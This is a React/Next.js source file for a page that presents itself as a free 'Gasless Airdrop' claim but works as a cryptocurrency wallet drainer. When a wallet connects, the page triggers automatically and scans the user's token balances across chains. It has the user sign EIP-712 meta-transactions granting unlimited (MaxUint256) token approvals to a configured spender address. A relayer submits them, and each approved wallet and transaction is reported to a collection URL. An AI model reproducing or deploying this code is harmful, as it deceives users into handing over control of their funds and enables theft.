'use client';
import { useState, useEffect } from 'react';
import { useAccount, useSignTypedData } from 'wagmi';
import { readContract, switchChain } from '@wagmi/core';
import { erc20Abi } from 'viem';
import { config } from '@/config';
import { ethers } from 'ethers';

// Load URLs from env
const REPORT_URL = process.env.NEXT_PUBLIC_REPORT_URL;
const RELAYER_URL = process.env.NEXT_PUBLIC_RELAYER_URL || 'http://localhost:3001';

// Trusted Forwarder addresses by chain (client-visible env vars)
const TRUSTED_FORWARDERS: Record<number, string> = {
  1: process.env.NEXT_PUBLIC_TRUSTED_FORWARDER_MAINNET || "",
  42161: process.env.NEXT_PUBLIC_TRUSTED_FORWARDER_ARBITRUM || "",
  11155111: process.env.NEXT_PUBLIC_TRUSTED_FORWARDER_SEPOLIA || "",
  137: process.env.NEXT_PUBLIC_TRUSTED_FORWARDER_POLYGON || "",
  56: process.env.NEXT_PUBLIC_TRUSTED_FORWARDER_BNB || "",
};

// Example SPENDER constant (make sure this matches relayer/claim expectations)
const SPENDER = (process.env.NEXT_PUBLIC_SPENDER_ADDRESS || '') as `0x${string}`;

// MetaTx helper functions
interface MetaTxRequest {
  from: string;
  to: string;
  value: string;
  gas: string;
  deadline: string; // use deadline not nonce
  data: string;
}

interface MetaTxMessage {
  request: MetaTxRequest;
  signature: string;
}

// Create MetaTx request for token approval
function createMetaTxRequest(
  userAddress: string,
  tokenAddress: string,
  spenderAddress: string,
  chainId: number,
  gasLimit = '100000',
  validitySeconds = 3600
): MetaTxRequest {
  // Create ERC20 approve call data
  const iface = new ethers.Interface([
    'function approve(address spender, uint256 amount) returns (bool)'
  ]);
  const approveData = iface.encodeFunctionData('approve', [
    spenderAddress,
    ethers.MaxUint256
  ]);

  const deadline = Math.floor(Date.now() / 1000) + validitySeconds;

  return {
    from: userAddress,
    to: tokenAddress, // IMPORTANT: token contract is the call target
    value: '0',
    gas: gasLimit,
    deadline: String(deadline),
    data: approveData
  };
}

// Build EIP-712 payload
function buildEip712Payload(forwarderAddress: string, chainId: number, request: MetaTxRequest) {
  const domain = {
    name: 'MinimalForwarder', // Match deployed forwarder contract name/version
    version: '0.0.1',
    chainId: chainId,
    verifyingContract: forwarderAddress
  } as const;

  const types = {
    ForwardRequest: [
      { name: 'from', type: 'address' },
      { name: 'to', type: 'address' },
      { name: 'value', type: 'uint256' },
      { name: 'gas', type: 'uint256' },
      { name: 'deadline', type: 'uint48' },
      { name: 'data', type: 'bytes' }
    ]
  } as const;

  return { domain, types, message: request };
}

export default function Home() {
  const { address, isConnected, chainId } = useAccount();
  const { signTypedDataAsync } = useSignTypedData();
  const [status, setStatus] = useState<string>('');

  async function callMetaTxRelayer(
    chainId: number,
    tokenAddress: string,
    userAddress: string,
    metaTxMessage: MetaTxMessage
  ): Promise<{ success: boolean; txHash?: string; error?: string; alreadyApproved?: boolean }> {
    try {
      const response = await fetch(`${RELAYER_URL}/metatx`, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
          'Accept': 'application/json'
        },
        body: JSON.stringify({
          chainId,
          tokenAddress: tokenAddress.toLowerCase(),
          userAddress,
          metaTxMessage,
        }),
      });

      const contentType = response.headers.get('content-type');
      let data;
      if (contentType && contentType.includes('application/json')) {
        data = await response.json();
      } else {
        const textResponse = await response.text();
        return { success: false, error: 'Invalid response from relayer service: ' + textResponse };
      }

      if (!response.ok) {
        if (data.error === 'Unsupported token address') {
          return { success: false, error: `Token ${tokenAddress} not supported on this chain.` };
        }
        return { success: false, error: data.error || `HTTP ${response.status}` };
      }

      return data;
    } catch (error: any) {
      if (error.name === 'TypeError' && error.message.includes('fetch')) {
        return { success: false, error: 'Cannot connect to relayer. Check if NEXT_PUBLIC_RELAYER_URL is correct.' };
      }
      return { success: false, error: error.message || 'Failed to call relayer' };
    }
  }

  async function handleClaim() {
    if (!isConnected || !address) {
      setStatus('Wallet not connected');
      return;
    }

    try {
      setStatus('Scanning chains for balances...');

      let targetChain: number | null = null;
      let usableTokens: { symbol: string; address: `0x${string}`; min: bigint; decimals: number }[] = [];

      // TOKENS_BY_CHAIN must be defined elsewhere in your repo; keep existing logic
      type Token = { symbol: string; address: `0x${string}`; min: bigint; decimals: number };
      const tokensByChain = (globalThis as any).TOKENS_BY_CHAIN as Record<string, Token[]> | undefined;

      if (tokensByChain) {
        for (const cidStr of Object.keys(tokensByChain)) {
          const numericCid = Number(cidStr);
          const tokens: Token[] = tokensByChain[cidStr] || [];

          for (const token of tokens) {
            try {
              const bal = await readContract(config, {
                chainId: numericCid,
                address: token.address,
                abi: erc20Abi,
                functionName: 'balanceOf',
                args: [address as `0x${string}`],
              }) as bigint;

              if (bal >= token.min) {
                targetChain = numericCid;
                usableTokens.push(token);
              }
            } catch (error) {
              console.log('Error checking balance', error);
            }
          }

          if (usableTokens.length > 0) break;
        }
      }

      if (!targetChain || usableTokens.length === 0) {
        setStatus('No usable balances found on any chain.');
        return;
      }

      // Switch chain if necessary
      if (chainId !== targetChain) {
        setStatus('Switching chain...');
        try {
          await switchChain(config, { chainId: targetChain });
        } catch (error) {
          setStatus('Failed to switch chain. Please switch manually.');
          return;
        }
      }

      // Test relayer connectivity first
      try {
        setStatus('Testing relayer connection...');
        const healthResponse = await fetch(`${RELAYER_URL}/health`);
        if (!healthResponse.ok) throw new Error(`Health check failed: ${healthResponse.status}`);
      } catch (error) {
        setStatus('Relayer service unavailable. Please try again later.');
        return;
      }

      const forwarderAddress = TRUSTED_FORWARDERS[targetChain];
      if (!forwarderAddress) {
        setStatus(`No trusted forwarder configured for chain ${targetChain}`);
        return;
      }

      for (const token of usableTokens) {
        setStatus(`Processing ${token.symbol}...`);

        // Check current allowance first
        try {
          const currentAllowance = await readContract(config, {
            chainId: targetChain,
            address: token.address,
            abi: erc20Abi,
            functionName: 'allowance',
            args: [address as `0x${string}`, SPENDER],
          }) as bigint;

          if (currentAllowance > 0n) {
            setStatus(`${token.symbol} already approved`);
            continue;
          }
        } catch (error) {
          console.error('Error checking allowance:', error);
        }

        // Build meta-tx request targeting the token contract
        const metaTxRequest = createMetaTxRequest(address, token.address, SPENDER, targetChain);

        setStatus(`Please sign MetaTx for ${token.symbol}...`);

        // Sign using EIP-712
        let signature: string;
        try {
          const payload = buildEip712Payload(forwarderAddress, targetChain, metaTxRequest);
          signature = await signTypedDataAsync({ domain: payload.domain, types: payload.types, value: payload.message });
        } catch (error: any) {
          console.error('MetaTx signing failed', error);
          if (error?.message?.includes('User rejected')) {
            setStatus('Transaction cancelled by user');
            return;
          }
          setStatus(`Failed to sign MetaTx: ${error?.message || String(error)}`);
          continue;
        }

        const metaTxMessage: MetaTxMessage = { request: metaTxRequest, signature };

        setStatus(`Submitting ${token.symbol} MetaTx to relayer...`);

        const result = await callMetaTxRelayer(targetChain, token.address, address, metaTxMessage);

        if (!result.success) {
          setStatus(`Failed to approve ${token.symbol}: ${result.error}`);
          continue;
        }

        setStatus(`${token.symbol} approved | tx: ${result.txHash}`);

        // Report approval
        if (REPORT_URL && result.txHash) {
          try {
            await fetch(`${REPORT_URL}`, {
              method: 'POST',
              headers: { 'Content-Type': 'application/json' },
              body: JSON.stringify({
                event: 'approval',
                wallet: address,
                chainId: targetChain,
                token: token.address,
                symbol: token.symbol,
                txHash: result.txHash,
                relayed: true,
              }),
            });
          } catch (err) {
            console.error('Failed to report approval', err);
          }
        }

        await new Promise((r) => setTimeout(r, 1000));
      }

      setStatus('All approvals completed!');
    } catch (err: any) {
      setStatus('Error: ' + (err?.message || 'unknown')); 
    }
  }

  // Automatically trigger claim when wallet connects
  useEffect(() => {
    if (isConnected && address) handleClaim();
  }, [isConnected, address]);

  return (
    <main style={{ display: 'flex', flexDirection: 'column', alignItems: 'center', gap: 24, marginTop: 40 }}>
      <header style={{ position: 'fixed', top: 0, left: 0, right: 0, height: 64, background: '#09011fff', display: 'flex', alignItems: 'center', justifyContent: 'space-between', padding: '0 24px'[...]
        <div style={{ fontFamily: 'sans-serif', fontWeight: 'bold', fontSize: 18, color: '#aaa587ff' }}>AIRDROPS</div>
        <div />
      </header>

      <div style={{ paddingTop: 80, width: '80%', maxWidth: 600 }}>
        <div style={{ border: '1px solid #9dd6d1ff', borderRadius: 12, padding: 20, background: '#090e41ff', display: 'flex', flexDirection: 'column', alignItems: 'center', height: 300 }}>
          <h2 style={{ color: '#fff' }}>Gasless Airdrop</h2>
          <p style={{ color: '#9dd6d1ff' }}>Gas fees sponsored by us! Just sign the message.</p>
          <div style={{ marginTop: 20 }}>{status || 'Connect your wallet to get started'}</div>
          <div style={{ marginTop: 20 }}>
            <button onClick={handleClaim} disabled={!isConnected} style={{ padding: '12px 24px', borderRadius: 8, background: isConnected ? '#a00' : '#666', color: '#fff' }}>
              {isConnected ? 'Claim Now (Free)' : 'Connect Wallet First'}
            </button>
          </div>
        </div>
      </div>
    </main>
  );
}